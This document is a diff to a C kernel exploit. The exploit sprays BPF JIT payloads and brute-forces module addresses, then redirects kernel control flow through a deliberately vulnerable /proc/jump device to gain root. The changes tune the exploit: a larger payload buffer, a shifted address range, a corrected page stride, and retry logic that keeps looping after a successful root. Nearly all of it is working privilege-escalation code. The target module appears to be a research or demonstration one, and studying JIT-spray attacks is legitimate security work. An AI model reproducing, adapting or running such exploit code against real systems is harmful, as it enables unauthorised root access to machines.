@@ -118,7 +118,7 @@
     die(_msg ": %s", strerror(errno))
 
 // Buffer to hold a BPF program.
-#define MAX_CODE_LEN 1024
+#define MAX_CODE_LEN 4096
 size_t code_len = 0;
 struct sock_filter code[MAX_CODE_LEN];
 struct sock_fprog  filt;
@@ -204,7 +204,7 @@ void get_root(uint64_t payload_addr);
 // The range described by mm.txt (and defined below) is actually only 1.5 GB.
 //
 
-#define MODULE_START 0xffffffffa6000000UL
+#define MODULE_START 0xffffffffa0000000UL
 #define MODULE_END   0xfffffffffff00000UL
 #define MODULE_PAGES ((MODULE_END - MODULE_START) / 0x1000)
 
@@ -256,7 +256,7 @@ int main() {
     // Real exploit would have to figure the address in some other way. 
     check_kptr_restrict();
 
-    for(i=0;i<70;i++) {
+    for(i=0;i<130;i++) {
     	emit_payload();
 	emit1(0xc3);
     }
@@ -311,7 +311,8 @@ int main() {
     	if ((jump_fd = open("/proc/jump", O_WRONLY)) < 0)
             errno_die("open(\"/proc/jump\")");
 	if (pgnumFinished == 1) {
-            if (read(urandom, &pgnum, sizeof(pgnum)) < sizeof(pgnum))
+            if ((unsigned int)(read(urandom, &pgnum, sizeof(pgnum)))
+		< sizeof(pgnum))
                 errno_die("read");
             pgnum %= MODULE_PAGES;
 	}
@@ -320,16 +321,15 @@ int main() {
         // So we fork off a child process to do the guessing.
         if (!(pid = fork())) {
             printf("\npgnum: %x, pgnumIncr: %d", pgnum, pgnumIncr);
-            printf("\nattempt: %lx", MODULE_START + (0x10 * pgnum) + pgnumIncr);
+            printf("\nattempt: %lx", MODULE_START + (0x1000 * pgnum) + pgnumIncr);
             fflush(stdout);
-            get_root(MODULE_START + (0x10 * pgnum) + pgnumIncr);
+            get_root(MODULE_START + (0x1000 * pgnum) + pgnumIncr);
             continue;
         } else {
-            if (pid < 0)
-                errno_die("fork");
-            // FIXME: handle EINTR here?
-            if (wait(&status) < 0)
-                errno_die("wait");
+		if (pid < 0)
+			errno_die("fork");
+		if (TEMP_FAILURE_RETRY(waitpid(pid, &status, 0)) < 0)
+			errno_die("wait");
         }
     	// Keep trying if the child got SIGKILL (probably due to kernel oops) or
     	// exited by calling die().
@@ -343,8 +343,17 @@ int main() {
 	} else {
 	    pgnumIncr += 1;
 	}
-    } while ((WIFSIGNALED(status) && (WTERMSIG(status) == SIGKILL))
-             || (WIFEXITED(status) && (WEXITSTATUS(status) == FAILURE_CODE)));
+	if (status == 0) {
+		//we got root and exited sucessfully
+		// we want to start from new page guessing
+		pgnumFinished = 1;
+		pgnumIncr = 0;
+	}
+    }  while ((WIFSIGNALED(status) && (WTERMSIG(status) == SIGKILL))
+		 || (WIFEXITED(status)
+		     && (WEXITSTATUS(status) == FAILURE_CODE))
+		|| (WIFEXITED(status) && (status == 0))
+		|| (WIFSIGNALED(status) && (WTERMSIG(status) == SIGSEGV)));
 
     // There's a significant delay on exit, as the kernel
     // garbage-collects our pile of sockets.
@@ -354,7 +363,7 @@ int main() {
 
 // Exploit jump.ko, transferring kernel control flow to payload_addr.
 void get_root(uint64_t payload_addr) {
-    if (write(jump_fd, &payload_addr, sizeof(payload_addr))
+    if ((unsigned int)(write(jump_fd, &payload_addr, sizeof(payload_addr)))
             < sizeof(payload_addr)) {
         printf("failed\n");
         fflush(stdout);
